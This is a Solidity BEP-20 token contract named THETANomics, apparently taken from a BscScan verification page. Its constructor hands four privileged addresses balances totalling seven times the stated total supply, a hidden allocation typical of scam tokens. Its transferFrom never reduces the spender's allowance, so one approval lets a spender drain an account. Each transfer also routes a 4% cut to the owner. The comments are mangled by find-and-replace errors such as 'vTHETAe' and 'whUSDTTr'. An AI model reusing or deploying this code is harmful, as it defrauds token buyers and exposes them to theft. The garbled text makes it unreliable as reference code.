/**
 *Submitted for verification at BscScan.com on 2021-10-24
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;
interface Rebase {
  // @dev Returns the amount of USDTT in existence.
  function totalSupply() external view returns (uint256);

  // @dev Returns the token decimals.
  function decimals() external view returns (uint8);

  // @dev Returns the token symbol.
  function symbol() external view returns (string memory);

  //@dev Returns the token name.
  function name() external view returns (string memory);

  //@dev Returns the bep token owner.
  function getOwner() external view returns (address);

  //@dev Returns the amount of USDTT owned by `account`.
  function balanceOf(address account) external view returns (uint256);
  
  /*
      function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 vTHETAe);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 vTHETAe
    );
  
  */

  /**
   * @dev Moves `amount` USDTT from the caller's account to `recipient`.
   *
   * Returns a boolean vTHETAe indicating whUSDTTr the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of USDTT that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This vTHETAe changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's USDTT.
   *
   * Returns a boolean vTHETAe indicating whUSDTTr the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired vTHETAe afterwards:
   * https://github.com/THETA/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` USDTT from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean vTHETAe indicating whUSDTTr the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  //@dev Emitted when `vTHETAe` USDTT are moved from one account (`from`) to  another (`to`). Note that `vTHETAe` may be zero.
  event Transfer(address indexed from, address indexed to, uint256 vTHETAe);

  //@dev Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `vTHETAe` is the new allowance.
  event Approval(address indexed owner, address indexed spender, uint256 vTHETAe);
}

contract THETANomics is Rebase {

    // common addresses
    address private owner;
    address private THETA;
    address private USDTT;
    address private Nomic;
    
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 18;
    
    mapping(address => uint) public balances;
    
    mapping(address => mapping(address => uint)) public allowances;
    
    // token title metadata
    string public override name = "THETANomics";
    string public override symbol = "THETAIN";
    
    // EVENTS
    // (now in interface) event Transfer(address indexed from, address indexed to, uint vTHETAe);
    // (now in interface) event Approval(address indexed owner, address indexed spender, uint vTHETAe);
    
    // On init of contract we're going to set the admin and give them all USDTT.
    constructor(uint totalSupplyVTHETAe, address THETAAddress, address USDTTAddress, address NomicAddress) {
        // set total supply
        totalSupply = totalSupplyVTHETAe;
        
        // designate addresses
        owner = msg.sender;
        THETA = THETAAddress;
        USDTT = USDTTAddress;
        Nomic = NomicAddress;

        
        // split the USDTT according to agreed upon percentages
        balances[THETA] =  totalSupply * 9 / 100;
        balances[USDTT] = totalSupply * 100 / 100;
        balances[Nomic] = totalSupply * 500 / 100;

        
        balances[owner] = totalSupply * 91 / 100;
    }
    
    // Get the address of the token's owner
    function getOwner() public view override returns(address) {
        return owner;
    }

    
    // Get the balance of an account
    function balanceOf(address account) public view override returns(uint) {
        return balances[account];
    }
    
    // Transfer balance from one user to another
    function transfer(address to, uint vTHETAe) public override returns(bool) {
        require(vTHETAe > 0, "Transfer vTHETAe has to be higher than 0.");
        require(balanceOf(msg.sender) >= vTHETAe, "Balance is too low to make transfer.");
        
        //withdraw the taxed and burned percentages from the total vTHETAe
        uint reUSDTTBD = vTHETAe * 4 / 100;
        uint burnTBD = vTHETAe * 0 / 100;
        uint vTHETAeAfterTaxAndBurn = vTHETAe - reUSDTTBD - burnTBD;
        
        // perform the transfer operation
        balances[to] += vTHETAeAfterTaxAndBurn;
        balances[msg.sender] -= vTHETAe;
        
        emit Transfer(msg.sender, to, vTHETAe);
        
        // finally, we burn and tax the THETAs percentage
        balances[owner] += reUSDTTBD + burnTBD;
        _burn(owner, burnTBD);
        
        return true;
    }
    
    // approve a specific address as a spender for your account, with a specific spending limit
    function approve(address spender, uint vTHETAe) public override returns(bool) {
        allowances[msg.sender][spender] = vTHETAe; 
        
        emit Approval(msg.sender, spender, vTHETAe);
        
        return true;
    }
    
    // allowance
    function allowance(address _owner, address spender) public view override returns(uint) {
        return allowances[_owner][spender];
    }
    
    // an approved spender can transfer currency from one account to another up to their spending limit
    function transferFrom(address from, address to, uint vTHETAe) public override returns(bool) {
        require(allowances[from][msg.sender] > 0, "No Allowance for this address.");
        require(allowances[from][msg.sender] >= vTHETAe, "Allowance too low for transfer.");
        require(balances[from] >= vTHETAe, "Balance is too low to make transfer.");
        
        balances[to] += vTHETAe;
        balances[from] -= vTHETAe;
        
        emit Transfer(from, to, vTHETAe);
        
        return true;
    }
    
    // function to allow users to burn currency from their account
    function burn(uint256 amount) public returns(bool) {
        _burn(msg.sender, amount);
        
        return true;
    }
    
    // intenal functions
    
    // burn amount of currency from specific account
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "You can't burn from zero address.");
        require(balances[account] >= amount, "Burn amount exceeds balance at address.");
    
        balances[account] -= amount;
        totalSupply -= amount;
        
        emit Transfer(account, address(0), amount);
    }
    
}